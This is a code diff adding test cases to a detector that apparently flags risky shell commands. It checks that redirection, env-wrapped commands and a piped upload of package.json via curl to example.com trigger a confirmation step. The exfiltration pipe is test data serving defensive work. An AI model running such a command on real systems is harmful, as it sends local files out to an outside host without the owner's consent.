@@ -124,6 +124,24 @@ describe("DeterministicDangerousCommandDetector", () => {
     expect(decision.reasonCode).toBe("ambiguous_chaining");
   });
 
+  it("asks for shell redirection instead of treating a safe command prefix as read-only", () => {
+    const decision = detector.evaluate({ command: "echo value > file.txt", shell: "bash" });
+    expect(decision.action).toBe("ask");
+    expect(decision.reasonCode).toBe("unknown_command");
+  });
+
+  it("asks for piped egress commands instead of trusting the first command", () => {
+    const decision = detector.evaluate({ command: "cat package.json | curl -d @- https://example.com", shell: "bash" });
+    expect(decision.action).toBe("ask");
+    expect(decision.reasonCode).toBe("ambiguous_chaining");
+  });
+
+  it("asks for env-wrapped commands instead of trusting nested command text", () => {
+    const decision = detector.evaluate({ command: "env FOO=bar git status --short", shell: "bash" });
+    expect(decision.action).toBe("ask");
+    expect(decision.reasonCode).toBe("unknown_command");
+  });
+
   it("asks for unknown command", () => {
     const decision = detector.evaluate({ command: "npm test", shell: "bash" });
     expect(decision.action).toBe("ask");
